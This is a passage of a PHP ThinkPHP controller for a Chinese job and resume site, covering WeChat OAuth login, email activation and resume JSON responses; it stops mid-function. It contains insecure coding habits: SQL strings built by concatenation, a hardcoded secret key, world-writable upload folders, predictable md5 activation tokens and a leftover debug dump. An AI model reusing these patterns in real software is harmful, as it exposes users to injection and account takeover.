<?php
//前台基类

namespace Home\Controller;
use Think\Controller;
use OT\TagLib\Think;

//use Com\Wechat;
//use Com\WechatAuth;

use Think\Model;
use Think\Upload;

use Common\Api\CropZoom;

use User\Api\UserApi;

/**
 * 前台公共控制器
 * 为防止多分组Controller名称冲突，公共Controller名称统一使用分组名称
 */
class HomeController extends Controller {

	public $uid;
	public $status;
	public $type;
	public $nickname;
	public $username;
	public $email;
	public $user_status;
	public $wx_openid;
	public $wx_hash;
	
	public $hash;//cwxu  bwxu
	public $account;

	public $down_key;
	public $time;
	public $file_pre = "thumb_";
	
	

	//初始化
	public function __construct(){
	    parent::__construct();   
	    
	    
	    $this->wx_openid = session("wx_openid");
	    $this->wx_hash = session("wx_hash");
	     
	    $this->hash = trim($_REQUEST['hash']);
	    $this->account = getWxConfig($this->hash);
	     
	    
	    
	    //如果是来自微信
	    if( isWeixinBrowser() ){//&& !$_GET ['getOpenId'] && !$_GET ['state'] 
	        
	        if( trim($_REQUEST['wx_hash']) ){// !$_GET ['state'] 
	            $this->wx_hash = trim($_REQUEST['wx_hash']);
	            if( getWxConfig($this->wx_hash) ){
	                session("wx_hash",$this->wx_hash);
	                $this->account = getWxConfig($this->wx_hash);
	            }
	            else{
	                customError("参数无效,请勿非法访问.");
	            }
	        }
	        
	        if (!$this->wx_hash){
	            customError("缺少必要参数，请联系管理员。");
	        }
	        
	        if( !$this->wx_openid ){
	            //获取用户的openid
	            //error_reporting(E_ALL);
	            import('Com.Wechat');
	            import('Com.WechatAuth');
	            //require_once (WEB_PATH.'/Cron/Library/Com/Wechat.class.php');
	            //require_once (WEB_PATH.'/Cron/Library/Com/WechatAuth.class.php');
	            $wechat_auth = new \Com\WechatAuth($this->account['appid'], $this->account['apps']);
	            //$wechat_auth = new WechatAuth($this->account['appid'], $this->account['apps']);
	            
	            $res = $wechat_auth->OAuthWeixin(substr(WEB_URL, 0,-1).$_SERVER['REQUEST_URI']);
	            
	            exit("请稍后");
	        }
	        else{
	            
	            //判断是否登录  如果没有查找是绑定过   如果是则直接登录
	            $check_bind = checkUserWxBind($this->wx_openid);
	            
	            $user0 = getUsersSession();
	            
	            if(!$user0['uid'] ){	                
	                 
	                if($check_bind){
	                     
	                    if($check_bind['user_status']<1){
	                        customError("用户被禁用。");
	                    }
	                     
	                    $Member = D('Member');
	                    if($Member->login($check_bind['uid'])){
	            
	            
	                    }
	                    else{
	                        customError("用户登录失败，请稍后再试。");
	                    }
	                }
	            }
	            else{
	                if(!$check_bind){
	                    session('user_auth', NULL);	                    
	                    session('user_auth_sign', NULL);
	                }
	            }
	            
	            //exit($this->wx_openid);
	        }
	        	        
	        
	    }
	    

	    $user = getUsersSession();
	    $this->uid = $user['uid'];
	    $this->status = $user['status'];
	    $this->type = $user['type'];
	    $this->nickname = $user['nickname'];
	    $this->username = $user['username'];
	    $this->email = $user['email'];
	    $this->user_status = $user['user_status'];
	    

	    /* 读取站点配置 */
	    $config = api('Config/lists');
	    C($config); //添加配置

	    if(!C('WEB_SITE_CLOSE')){
	        $this->error('站点已经关闭，请稍后访问~');
	    }

	    $this->time = time();// 返回当前时间（用于定义图像目录命名）
	    $this->imgpath = "/Public/Uploads/UsersPic/".date('Ymd',$this->time).'/';
	    if( !file_exists($this->imgpath) ){
	        /* if( !file_exists("Public/Uploads/UsersPic/".date('Ym',$this->ctime).'/') ){
	         mkdir("Public/Uploads/UsersPic/".date('Ym',$this->ctime),'0777',1);
	         }
	         $rs = mkdir($this->imgpath,'0777',1);
	         if(!$rs) exit('路径创建失败');  */
	        $this->mkimgpath($this->imgpath, $mode = 0777);
	    }

	    $this->down_key = "80a-2(&)![+{_=_}-]";

	    $this->file_pre = "ua_";

	    $this->assign("is_phone",IS_WAP);
	    $this->assign("is_phone_fact",IS_WAP_FACT);

	    $this->assign("cuser_type",$this->type);

	    $this->assign("cur_top_nav",array("index"=>'class="current"') );

	    $this->assign("show_nav",1);
	    

	}

	// 临时情况session
	public function clean_session()
	{
	    foreach ( $_SESSION as $k=>$v ){
	        unset($_SESSION[$k]);
	    }
	    unset($_SESSION);
	    session_destroy();
	}

    //创建目录
    public function mkimgpath($dir, $mode = 0777)
    {
        if (is_dir($dir) || @mkdir($dir,$mode)) return true;
        //if (!mk_dir(dirname($dir),$mode)) return false;
        return @mkdir($dir,$mode);
    }

    /* 空操作，用于输出404页面 */
    public function _empty(){
        //$this->error("你访问的地址有误或已删除");
        //$this->redirect('Index/index');
        $this->display("Public/404");
        
    }


	/* 用户登录检测 */
	protected function login(){
		/* 用户登录检测 */
		is_login() || $this->error('您还没有登录，请先登录！', U('User/login'));
	}

	/* 用户身份检测*/
	protected function checkUser($user=array(),$return=0){
	    $this->login();
	    $uid = is_login();
	    if(!$user && $uid){
	        $user = getUsersInfo("m.uid='".$uid."'");
	    }
	    if(!$user){
	        D('Member')->logout();
	        $this->success('请先登录！', U('User/login'));
	    }
	    if($user['status']!=1){
	        D('Member')->logout();
	        $this->success('你已经被禁止了！', U('User/login'));
	    }
	    elseif($user['check_email']!=1){
	        return 0;
	    }

	    return 1;
	}

	//根据用户id获取用户信息
	public function getUsersInfoById($uid){
	    if(!$uid){
	        return array();
	    }
	    //$user =$this->getUsersInfoById($uid);
	    $user =getUsersInfo("m.uid='".$uid."'");
	    return $user;
	}

	//检查是否
	/* function checkResumeUserIsLogin(){
	    $uid = $this->uid;

	    if(!$uid){
	        //$this->error('请先登陆。',WEB_URL.'User/login');
	        $this->ResumeJson(0,"请先登陆。");
	    }
	} */

	//根据身份    跳转到用户中心
	public function gotoUserIndex($type=0){
	    if($type==1){
	        return "/User/index";
	    }
	    else return "/Company/index";
	}

	/**
	 检查邮箱是否激活
	 */
	public function checkEmail() {

	    if(!$this->uid) {
	        $this->error('你还没有登录，请先登陆。',WEB_URL.'User/login');
	    }

	    /* if( $this->type ){
	     if($this->status>2){
	     $this->redirect("/User/cinfo");
	     }
	     else if($this->status==2) {
	     $this->redirect("/User/myresume");
	     }
	     } */

	    

	    $info = $this->getUsersInfoById($this->uid);
	    
	    if( $info['check_email'] ){//$this->status>1 && 
	        $this->redirect($this->gotoUserIndex($this->type));
	        exit;
	    }

	    $email_link = getEmailDomain($info['email']);

	    $this->assign(array(
	        'email'=>$info['email'],
	        'email_link'=>$email_link,
	        'userid'=>$info['email_key'],
	        'type'=>'',
	    ));
	    $this->assign("show_nav",0);
	    $this->display();

	}

	/**
	 检查邮箱是否激活
	 */
	public function checkEmail_iframe() {

	    if(!$this->uid) {
	        $this->error('你还没有登录，请先登陆。',WEB_URL.'User/login');
	    }

	    /* if( $this->type ){
	     if($this->status>2){
	     $this->redirect("/User/cinfo");
	     }
	     else if($this->status==2) {
	     $this->redirect("/User/myresume");
	     }
	     } */

	    

	    $info = $this->getUsersInfoById($this->uid);
	    
	    if( $info['check_email'] ){//$this->status>1 && 
	        $this->redirect($this->gotoUserIndex($this->type));
	        exit;
	    }

	    $email_link = getEmailDomain($info['email']);

	    $this->assign(array(
	        'email'=>$info['email'],
	        'email_link'=>$email_link,
	        'userid'=>$info['email_key'],
	        'type'=>'',
	    ));
	    $this->assign("show_nav",0);
	    $this->display('checkEmail_iframe');

	}

	//重发邮件
	public function resendEmail(){
	    if(!$this->uid){
	        $this->error('请先登录！');
	    }

	    $info = $this->getUsersInfoById($this->uid);
	    if($info['check_email'] ){
	        $this->error('该账号已激活了，请勿重复操作！');
	    }
	    if($info){
	        if(1){//$info['status']==0 || $info['status']==1

	            $check = $this->sendActiveEmail($info['uid'],$info['email']);

	            //$check = sendById(1,$email_send,$email_link);

	            if($check){
	                $this->success('邮件发送成功，请使用最新的邮件进行激活！');
	            }
	            else $this->error('邮件发送失败，请稍后再试！');
	        }
	        else{

	            $this->success('该邮箱已激活，请勿重复操作。');
	        }
	    }
	    else{
	        $this->error('参数无效，请勿非法操作。');
	    }

	    exit("ok");
	}

	//重发邮件
	public function resendPasswordEmail(){
		$email = $this->email;
		var_dump($email);
		exit();
	    // if(!$this->uid){
	    //     $this->error('请先登录！');
	    // }

	    //$info = $this->getUsersInfoById($this->uid);
	    // if($info['check_email'] ){
	    //     $this->error('该账号已激活了，请勿重复操作！');
	    // }
	    if($email){
	        if(1){//$info['status']==0 || $info['status']==1

	            $check = $this->sendActiveEmail($info['email']);

	            //$check = sendById(1,$email_send,$email_link);

	            if($check){
	                $this->success('邮件发送成功，请使用最新的邮件进行激活！');
	            }
	            else $this->error('邮件发送失败，请稍后再试！');
	        }
	        else{

	            $this->success('该邮箱已激活，请勿重复操作。');
	        }
	    }
	    else{
	        $this->error('参数无效，请勿非法操作。');
	    }

	    exit("ok");
	}

	//发送邮箱激活邮件
	function sendActiveEmail($uid,$email_send){
	    if(!$uid){
	        $uid = $this->uid;
	    }
	    $time = time();
	    $code = md5($uid.$time );
	    $data['email_send_time'] = $time;
	    $data['email_key'] = $code;

	    $email_link = WEB_URL."User/docheckEmail/?key=".$code;

	    if(!$email_send){
	        return 0;
	    }
	    //$check = sendById(1,$email_send,$email_link);
	    $check = sendById(1,$email_send,0,array("email"=>$email_send,"link"=>$email_link));
	    if($check){
	        M("member")->where(array('uid'=>$uid))->save($data);
	    }
	    return $check;
	}

	/**
	 邮箱激活   判断是否正确
	 */
	public function docheckEmail() {
	    $key = addslashes(trim($_GET['key']));
	    if(!$key){
	        $this->error('参数无效！',WEB_URL.'');
	    }

	    $info = M("member")->where(array('email_key'=>$key))->find();

	    if($info){

	        if( $info['check_email'] ){
	            if($this->uid){
	                $this->status = $info['status'];
	                inputUsersSession('status',$this->status);
	            }
	            $this->success('该邮箱已激活，请勿重复操作。',$this->gotoUserIndex($info['type']));
	            exit;
	        }
	        elseif($info['status']==0 || $info['status']==1 ||  $info['check_email']==0){
	            $data = array( 'email_check_time'=>time(),'check_email'=>1 );
	            if($info['status']<100){
	                $data['status'] = 2;
	            }
	            M("member")->where(array('uid'=>$info['uid']))->save($data);
	            
	            checkCompanyStatus($info['uid']);
	            
	            if($this->uid){
	                $this->status = 2;
	                inputUsersSession('status',$this->status);
	            }

	            $ucenter = M("ucenter_member")->where(array('id'=>$info['uid']))->find();

	            $this->assign("show_nav",0);
	            $this->assign("type",'success');
	            $this->assign("user_type",$info['type']);
	            $this->assign("email",$ucenter['email']);
	            $this->display("checkemail");
	        }
	        /* else{
	            if($this->uid){//&&$this->type==0
	                $this->status = 2;
	                inputUsersSession('status',$this->status);
	            }

	            $this->success('该邮箱已激活，请勿重复操作。',$this->gotoUserIndex($this->type));
	        } */
	    }
	    else{
	        $this->error('无效的激活链接，请先登陆。',WEB_URL.'User/login');
	    }

	}

	

	//检查邮箱是否可用
	function checkEmailOk(){
	    $this->checkUser();
	    $email = trim($_POST['email']);
	    $uid = $this->uid;
	    if(!$email){
	        $this->error("请填写正确的邮箱！");
	    }
	    $check = M("member")->where(array('email'=>$email,'uid'=>array('neq',$this->uid)) )->find();
	    if($check){
	        $this->error("邮箱已被使用，请更换！");
	    }
	    else{
	        $this->success("ok");
	    }
	}

	//输出ajax内容
	function exitJson($code=1,$success=TRUE,$msg='操作成功',$content=array(),$resubmitToken='',$requestId=''){

	    $content_data = array(
	        'code'=>$code,
            'success'=>$success,
            'msg'=>$msg,
	        "message"=>$msg,
            'content'=>$content,
	        'resubmitToken'=>$resubmitToken?$resubmitToken:$_REQUEST['resubmitToken'],
	        'requestId'=>$requestId?$requestId:$_REQUEST['requestId'],
        );

	    if(isset($content['state'])){
	        $content_data['state'] = $content['state'];
	        if(isset($content_data['content']['state'])){
	            //unset($content_data['content']['state']);
	        }

	    }
        //print_test($content_data);
	    exit(json_encode($content_data));
	}

	function NumberCounter($a,$b,$list){
		 //$list = array();
		//  if(!$uid){
	 //        $uid = $this->uid;
	 //    }
		// $list = getUsersEduExperience($uid);
		//$num_counter = count($list);
		$list_num= count($list);
		for ($i=0; $i < $list_num ; $i++) { 
			$list_arr[$i] = count(array_filter($list[$i])); 
		} 
		$list_num = $list_num*$a; 
		$list_arr = array_sum($list_arr);

		$num_counter[0] = $list_arr-$list_num;

		$list_tnum = count($list, true); 
		$list_tarr = $b*count($list); 
		$num_counter[1] = $list_tnum-$list_tarr;

		return $num_counter;
	}

	function InfoNumber($list){
		$num_counter = array();
		$num_counter[0] = count(array_filter($list[0]));
		$num_counter[1] = count($list[0]);
		return $num_counter;
	}


	//我的简历  输出内容
	function ResumeJson($status=1,$msg='操作成功',$step='basic',$uid=0,$ext_data=array()){
	    if(!$uid){
	        $uid = $this->uid;
	    }

	    if($status==0 || !$uid ){
	        $content = array(
	            'status'=>0,
	            'success'=>0,
	            'url'=>'',
	            'info'=>$msg,
	            'msg'=>$msg,
	            'content'=>array(),
	            'code'=>0,
	        );
	    }
	    else{
	        $myinfo = $this->getUsersInfoById($uid);

	        $resume_score = getResumeScore($myinfo);

	        $next_step = getResumeStepNext($myinfo);

	        if(in_array($step, array('head','head_cut',"logo_cut","logo",'resume','company_info'))){
	            $resume = array();
	        }
	        else $resume = array(
                'shieldEmailSuffix'=>'',
                'deliverResumeConfirm' => 0,
                'refuseCount' => 0,
                'markCanInterviewCount' => 0,
                'pageMark' => 3,
                'haveNoticeInterCount' => 0,
                "resubmitToken"=>$_POST['resubmitToken'],

                'positionName' =>$myinfo['position_name'],
                'workYear' => $myinfo['workyear'],
                'haveNoticeInterCount' => 0,
                'email' => $myinfo['email'],
                'userId' => $myinfo['uid'],
                'positionType' =>$myinfo['position_type'],
                'updateTime' => $myinfo['update_time'],
                'resumekey' => '',
                'resumeName' => $myinfo['resume_name'],
                'createTime' => $myinfo['reg_time'],
                'sex' => $myinfo['sex'],
                'liveCity' => $myinfo['city'],
                'birthday' => $myinfo['birthday'],
                'phone' => $myinfo['phone'],
                'perfect' => "110001001000000000000000",
                'highestEducation' => $myinfo['edu'],
                'salarys' =>$myinfo['salarys'],
                'isDel' => 0,//$myinfo['status']?0:1,
                'deliverNearByConfirm' => 0,
                'headPic' => $myinfo['pic'],
                'myRemark' => $myinfo['remark'],
                'status' => $myinfo['workstatus'],
                'name' => $myinfo['realname'],
                'id' => $myinfo['uid'],

                'oneWord'=>$myinfo['oneWord'],
                'isOpenMyResume'=>$myinfo['isOpenMyResume'],
            );
	        $content = array(
	            'status'=>1,
	            'success'=>true,
	            'code'=>1,
	            'url'=>'',
	            'info'=>$msg,
	            'msg'=>$msg,
	            "resubmitToken"=>$_POST['resubmitToken'],
	            'content'=>array(
	                'resume' => $resume,
	                'refreshTime' => date("Y-m-d H:i:s"),
	                'jsonIds' => array(),
	                'firstOpen'=>false,
	            ),
	        );

	        switch ($step){
	            case 'basic':
	                $content['content']['isNew'] = false;
	                $list = getUsersResumeInfo($uid);
	                $num_counter = $this->InfoNumber($list);
	                $content['content']['firstnum'] = $num_counter[0];
	                $content['content']['totalnum'] = $num_counter[1];
	                $alllist = getUsersAllInfo($uid);
	                $content['content']['allnum'] = $alllist[0];
	                $content['content']['allemptynum'] = $alllist[1];
	                $emptylist = getUsersEmptyInfo($uid);
	                $content['content']['lownum'] = $emptylist[0];
	                $content['content']['lowemptynum'] = $emptylist[1];
	                $content['content']['resume']['score'] = $resume_score;
	                $content['content']['infoCompleteStatus']['score'] = $resume_score;
	                $content['content']['resume']['userIdentity'] = 2;
	                $content['content']['infoCompleteStatus'] = array(
	                    'score' => $resume_score,
	                    'nextStage' => $next_step['key'],
	                    'msg' => $next_step['memo'],
	                );
	                break;
	            case 'qiwang':
	                $content['content']['isNew'] = 0;
	                $content['content']['expectJobs'] = array(
	                    'createTime'=>0,
	                    'positionName'=>$myinfo['position_name'],
	                    'city'=>$myinfo['expect_city'],
	                    'positionType'=>$myinfo['position_type'],
	                    'salarys'=>$myinfo['salarys'],
	                    'addExplain'=>$myinfo['expect_memo'],
	                    'id'=>$myinfo['uid'],
	                );
	                $content['content']['infoCompleteStatus'] = array(
	                    'score' => $resume_score,
	                    'nextStage' => $next_step['key'],
	                    'msg' => $next_step['memo'],
	                );
	                break;
                case 'jineng':
                    $content['content']['isNew'] = 0;
                    $content['content']['code'] = 1;
                    $content['content']['skillEvaluates'] = getUsersSkill($uid);
                    $content['content']['infoCompleteStatus'] = array(
                        'score' => $resume_score,
                        'nextStage' => $next_step['key'],
	                    'msg' => $next_step['memo'],
                    );
                    break;
	            case 'jingyan':
	                global $expid;
	                $content['content']['isNew'] = false;
	                $list = getUsersWorkExperience($uid);
	                $num_counter = $this->NumberCounter(2,6,$list);
	                $content['content']['firstnum'] = $num_counter[0];
	                $content['content']['totalnum'] = $num_counter[1];
	                $alllist = getUsersAllInfo($uid);
	                $content['content']['allnum'] = $alllist[0];
	                $content['content']['allemptynum'] = $alllist[1];
	                $emptylist = getUsersEmptyInfo($uid);
	                $content['content']['lownum'] = $emptylist[0];
	                $content['content']['lowemptynum'] = $emptylist[1];
	                $content['content']['workExperiences'] = $list;
	                $content['content']['infoCompleteStatus'] = array(
	                    'score' => $resume_score,
	                    'nextStage' => $next_step['key'],
	                    'msg' => $next_step['memo'],
	                );
	                $content['content']['companyLogo'] = '';
	                $content['content']['hasLatestWorkExperience']= true;
	                if($list){
	                    $content['content']['hasLatestEducationExperience']= true;
	                }
	                //if($ext_data['last']){
	                    $content['content']['latestWorkExperience'] = $list[0];
	                //}
	                break;

	            case 'jiaoyu':
	                global $eduid;
	                $content['content']['isNew'] = false;
	                $list = getUsersEduExperience($uid);
	                $num_counter = $this->NumberCounter(3,9,$list);
	                $content['content']['firstnum'] = $num_counter[0];
	                $content['content']['totalnum'] = $num_counter[1];
	                $alllist = getUsersAllInfo($uid);
	                $content['content']['allnum'] = $alllist[0];
	                $content['content']['allemptynum'] = $alllist[1];
	                $emptylist = getUsersEmptyInfo($uid);
	                $content['content']['lownum'] = $emptylist[0];
	                $content['content']['lowemptynum'] = $emptylist[1];
	                $content['content']['educationExperiences'] = $list;
	                $content['content']['companyLogo'] = '';
	                $content['content']['infoCompleteStatus'] = array(
	                    'score' => $resume_score,
	                    'nextStage' => $next_step['key'],
	                    'msg' => $next_step['memo'],
	                );
	                if($list){
	                    $content['content']['hasLatestEducationExperience']= true;
	                }
	                $content['content']['latestEducationExperience'] = $list[0];
	                break;

	            case 'zaixiaoshijian':
	                global $schpraid;
	                $content['content']['isNew'] = false;
	                $list = getSchoolPractice($uid);
	                $num_counter = $this->NumberCounter(2,6,$list);
	                $content['content']['firstnum'] = $num_counter[0];
	                $content['content']['totalnum'] = $num_counter[1];
	                $alllist = getUsersAllInfo($uid);
	                $content['content']['allnum'] = $alllist[0];
	                $content['content']['allemptynum'] = $alllist[1];
	                $emptylist = getUsersEmptyInfo($uid);
	                $content['content']['lownum'] = $emptylist[0];
	                $content['content']['lowemptynum'] = $emptylist[1];
	                $content['content']['schoolPractices'] = $list;
	                $content['content']['companyLogo'] = '';
	                $content['content']['infoCompleteStatus'] = array(
	                    'score' => $resume_score,
	                    'nextStage' => $next_step['key'],
	                    'msg' => $next_step['memo'],
	                );
	                if($list){
	                    $content['content']['hasLatesSchoolPractice']= true;
	                }
	                $content['content']['latestSchoolPractice'] = $list[0];
	                break; 

	            case 'shetuan':
	                global $schoolclubid;
	                $content['content']['isNew'] = false;
	                $list = getUsersSchoolClub($uid);
	                $num_counter = $this->NumberCounter(1,2,$list);
	                $content['content']['firstnum'] = $num_counter[0];
	                $content['content']['totalnum'] = $num_counter[1];
	                $alllist = getUsersAllInfo($uid);
	                $content['content']['allnum'] = $alllist[0];
	                $content['content']['allemptynum'] = $alllist[1];
	                $emptylist = getUsersEmptyInfo($uid);
	                $content['content']['lownum'] = $emptylist[0];
	                $content['content']['lowemptynum'] = $emptylist[1];
	                $content['content']['schoolClubs'] = $list;
	                $content['content']['companyLogo'] = '';
	                $content['content']['infoCompleteStatus'] = array(
	                    'score' => $resume_score,
	                    'nextStage' => $next_step['key'],
	                    'msg' => $next_step['memo'],
	                );
	                if($list){
	                    $content['content']['hasLatesSchoolClubs']= true;
	                }
	                $content['content']['latestSchoolClubs'] = $list[0];
	                break;  
	            case 'huojiang':
	                //global $schoolclubid;
	                $content['content']['isNew'] = false;
	                $list = getUsersSchoolAwards($uid);
	                $num_counter = $this->NumberCounter(1,2,$list);
	                $content['content']['firstnum'] = $num_counter[0];
	                $content['content']['totalnum'] = $num_counter[1];
	                $alllist = getUsersAllInfo($uid);
	                $content['content']['allnum'] = $alllist[0];
	                $content['content']['allemptynum'] = $alllist[1];
	                $emptylist = getUsersEmptyInfo($uid);
	                $content['content']['lownum'] = $emptylist[0];
	                $content['content']['lowemptynum'] = $emptylist[1];
	                $content['content']['schoolAwards'] = $list;
	                $content['content']['companyLogo'] = '';
	                $content['content']['infoCompleteStatus'] = array(
	                    'score' => $resume_score,
	                    'nextStage' => $next_step['key'],
	                    'msg' => $next_step['memo'],
	                );
	                if($list){
	                    $content['content']['hasLatesSchoolAwards']= true;
	                }
	                $content['content']['latestSchoolAwards'] = $list[0];
	                break;  
	             case 'zhengshu':
	                //global $schoolclubid;
	                $content['content']['isNew'] = false;
	                $list = getUsersCertificate($uid);
	                $num_counter = $this->NumberCounter(1,2,$list);
	                $content['content']['firstnum'] = $num_counter[0];
	                $content['content']['totalnum'] = $num_counter[1];
	                $alllist = getUsersAllInfo($uid);
	                $content['content']['allnum'] = $alllist[0];
	                $content['content']['allemptynum'] = $alllist[1];
	                $emptylist = getUsersEmptyInfo($uid);
	                $content['content']['lownum'] = $emptylist[0];
	                $content['content']['lowemptynum'] = $emptylist[1];
	                $content['content']['certificates'] = $list;
	                $content['content']['companyLogo'] = '';
	                $content['content']['infoCompleteStatus'] = array(
	                    'score' => $resume_score,
	                    'nextStage' => $next_step['key'],
	                    'msg' => $next_step['memo'],
	                );
	                if($list){
	                    $content['content']['hasLatesCertificates']= true;
	                }
	                $content['content']['latestCertificates'] = $list[0];
	                break;  

	            case 'trainingexp':
	                //global $schoolclubid;
	                $content['content']['isNew'] = false;
	                $list = getUsersTrainingExperience($uid);
	                $num_counter = $this->NumberCounter(1,2,$list);
	                $content['content']['firstnum'] = $num_counter[0];
	                $content['content']['totalnum'] = $num_counter[1];
	                $alllist = getUsersAllInfo($uid);
	                $content['content']['allnum'] = $alllist[0];
	                $content['content']['allemptynum'] = $alllist[1];
	                $emptylist = getUsersEmptyInfo($uid);
	                $content['content']['lownum'] = $emptylist[0];
	                $content['content']['lowemptynum'] = $emptylist[1];
	                $content['content']['trainingExperiences'] = $list;
	                $content['content']['companyLogo'] = '';
	                $content['content']['infoCompleteStatus'] = array(
	                    'score' => $resume_score,
	                    'nextStage' => $next_step['key'],
	                    'msg' => $next_step['memo'],
	                );
	                if($list){
	                    $content['content']['hasLatesTrainingExperiences']= true;
	                }
	                $content['content']['latestTrainingExperiences'] = $list[0];
	                break;  

	            case 'otherinfo':
	                //global $schoolclubid;
	                $content['content']['isNew'] = false;
	                $list = getUsersotherInfo($uid);
	                $num_counter = $this->NumberCounter(1,2,$list);
	                $content['content']['firstnum'] = $num_counter[0];
	                $content['content']['totalnum'] = $num_counter[1];
	                $alllist = getUsersAllInfo($uid);
	                $content['content']['allnum'] = $alllist[0];
	                $content['content']['allemptynum'] = $alllist[1];
	                $emptylist = getUsersEmptyInfo($uid);
	                $content['content']['lownum'] = $emptylist[0];
	                $content['content']['lowemptynum'] = $emptylist[1];
	                $content['content']['otherInfos'] = $list;
	                $content['content']['companyLogo'] = '';
	                $content['content']['infoCompleteStatus'] = array(
	                    'score' => $resume_score,
	                    'nextStage' => $next_step['key'],
	                    'msg' => $next_step['memo'],
	                );
	                if($list){
	                    $content['content']['hasLatesOtherInfos']= true;
	                }
	                $content['content']['latestOtherInfos'] = $list[0];
	                break;         
	            case 'customize':
	                //global $schoolclubid;
	                $content['content']['isNew'] = false;
	                $list = getUsersCustomize($uid);
	                $content['content']['customize'] = $list;
	                if($list){
	                    $content['content']['hasLatesCustomize']= true;
	                }
	                $content['content']['latestCustomize'] = $list[0];
	                break; 

	            case 'xiangmu':
	                global $projectid;
	                $content['content']['isNew'] = false;
	                if($msg=="删除成功！"){
	                    $content['code'] = 1;
	                }
	                else if($projectid){
	                    $content['code'] = 4;
	                }
	                else {
	                    $content['code'] = 3;
	                }

	                $list = getUsersProExperience($uid);
	                $num_counter = $this->NumberCounter(2,6,$list);
	                $content['content']['firstnum'] = $num_counter[0];
	                $content['content']['totalnum'] = $num_counter[1];
	                $alllist = getUsersAllInfo($uid);
	                $content['content']['allnum'] = $alllist[0];
	                $content['content']['allemptynum'] = $alllist[1];
	                $emptylist = getUsersEmptyInfo($uid);
	                $content['content']['lownum'] = $emptylist[0];
	                $content['content']['lowemptynum'] = $emptylist[1];
	                $content['content']['projectExperiences'] = $list;
	                if($list){
	                    $content['content']['projectExperience']= $list[0];
	                }

	                $content['content']['infoCompleteStatus'] = array(
	                    'score' => $resume_score,
	                    'nextStage' => $next_step['key'],
	                    'msg' => $next_step['memo'],
	                );
	                $content['content']['companyLogo'] = '';
	                break;

	            case 'ziwo':
	                $content['content']['isNew'] = false;
	                $content['content']['infoCompleteStatus'] = array(
	                    'score' => $resume_score,
	                    'nextStage' => $next_step['key'],
	                    'msg' => $next_step['memo'],
	                );
	                $content['content']['code'] = 1;
	                break;


	            case 'zuopin':

	                global $wsid;
	                $content['content']['isNew'] = false;
	                $next = "complete";
	                $next_msg = "哇！你的简历已经相当完善了，赶紧去投递你中意的职位吧！";

	                $list = getUsersWorks($uid);
	                $content['content']['workShows'] = $list;

	                if($msg=="删除成功！"){
	                    $content['code'] = 1;
	                    if(!$list){
	                        $next = "worksShow";
	                        $next_msg = "秀出自己的优秀作品，一目了然呈现自己的工作水平！";
	                    }
	                    $content['content']['needUpdate'] = true;
	                }
	                else if($wsid){
	                    $content['code'] = 4;
	                }
	                else {
	                    $content['code'] = 3;
	                }

	                if($list){
	                    $content['content']['workShow']= $list[0];
	                }

	                $content['content']['infoCompleteStatus'] = array(
	                    'score' => $resume_score,
	                    'nextStage' => $next_step['key'],
	                    'msg' => $next_step['memo'],
	                );
	                $content['content']['companyLogo'] = '';
	                break;


                case 'custom':

                    global $defineId;
                    $content['content']['isNew'] = false;
                    $next = "complete";
                    $next_msg = "哇！你的简历已经相当完善了，赶紧去投递你中意的职位吧！";

                    $list = getUserDefine($uid);
                    //$content['content']['userDefines'] = $list;
                    $content['content']['userDefine']= $list;

                    $content['content']['infoCompleteStatus'] = array(
                        'score' => $resume_score,
                        'nextStage' => $next_step['key'],
	                    'msg' => $next_step['memo'],
                    );
                    $content['content']['companyLogo'] = '';
                    break;
                case 'resume':
                    $content['code']=0;
                    $content['resubmitToken']='';
                    $content['content']=array(
                        'convertErrTimes'=>0,
                        "hideContactImgUrls"=>"",
                        "hideContactPdfUrl"=>"",
                        "id"=>$ext_data['id'],
                        "imgUrls"=>"",
                        "isDel"=>0,
                        "nearbyName"=>$ext_data['name'],
                        "nearbyUrl"=>$ext_data['url'],
                        "pdfUrl"=>"",
                        "resumeUploadTimeStr"=>date("Y-m-d H:i",time()),
                        "time"=>date("Y-m-d H:i",time()),
                        'createTime'=>array(
                            "date"=>24,
                            "day"=>0,
                            "hours"=>12,
                            "minutes"=>14,
                            "month"=>4,
                            "seconds"=>15,
                            "time"=>time(),
                            "timezoneOffset"=>-480,
                            "year"=>115,
                        ),
                        'updateTime'=>array(),
                        'userId'=>$uid,
                    );
                    $content['content']['updateTime'] = $content['content']['createTime'];
                    break;
                case 'head':
                    $img_info = getimagesize(WEB_PATH.$ext_data['url']);
                    $content['content']['srcImageW'] = $img_info[0];
                    $content['content']['srcImageH'] = $img_info[1];
                    $content['content']['uploadPath'] = $ext_data['url'];
                    break;
                case 'logo_cut':
                    $content['content'] = $ext_data['url'];
                    $content['code'] = 0;
                    break;
                case 'head_cut':
                    $img_info = getimagesize(WEB_PATH.$ext_data['url']);
                    $content['code'] = 1;
                    $content['content']['uploadPath'] = $ext_data['url'];

                    $content['content']['isNew'] = 0;
                    $content['content']['infoCompleteStatus'] = array(
                        'score' => $resume_score,
                        'nextStage' => 'expectPosition',
                        'msg' => "展示自己的期望职位，匹配更优秀的公司！",
                    );
                    unset($content['content']['resume']);
                    //unset($content['content']['refreshTime']);
                    unset($content['content']['jsonIds']);
                    unset($content['content']['firstOpen']);
                    unset($content['status']);
                    unset($content['url']);
                    unset($content['info']);

                    $content['content']['requestId']='';
                    break;
                case 'company_info':
                	$gongsi_xingzhi = C("GONGSI_XINGZHI");
                    $content['content']['logo'] = $myinfo['logo'];
                    $content['content']['gongsi_xingzhi'] = $gongsi_xingzhi[$myinfo['gongsi_xingzhi']];
                    $content['content']['companyName'] = $myinfo['company_name'];
                    $content['content']['city'] = $myinfo['company_city'];
                    $content['content']['industryField'] = $myinfo['hangye'];
                    $content['content']['companySize'] = $myinfo['guimu'];
                    $content['content']['financeStage'] = $myinfo['jieduan'];
                    $content['content']['companyFeatures'] = $myinfo['descri'];
                    $content['content']['companyShortName'] = $myinfo['company_short_name'];
                    $content['content']['companyUrl'] = $myinfo['web_url'];
                    $content['content']['tags'] = $myinfo['tags'];
                    $content['content']['businessLicenes'] = $myinfo['businessLicenes'];

                    if( isset($ext_data['content']) ){
                        $content['content'] = $ext_data['content'];
                    }

                    if(isset($ext_data['code'])){
                        $content['code']=$ext_data['code'];
                    }
                    break;

	        }
	    }
	       //print_test($content);
	    exit(json_encode($content));//,JSON_UNESCAPED_SLASHES

	}

	//分页
	function _getPage($table,$map=array(),$pk=''){
	    if(!$table){
	        return array();
	    }
	    $REQUEST    =   (array)I('request.');
	    $model = M($table);
	    $total        =   $model->where($map)->count();

	    if( isset($REQUEST['r']) ){
	        $listRows = (int)$REQUEST['r'];
	    }else{
	        $listRows = C('LIST_ROWS') > 0 ? C('LIST_ROWS') : 10;
	    }

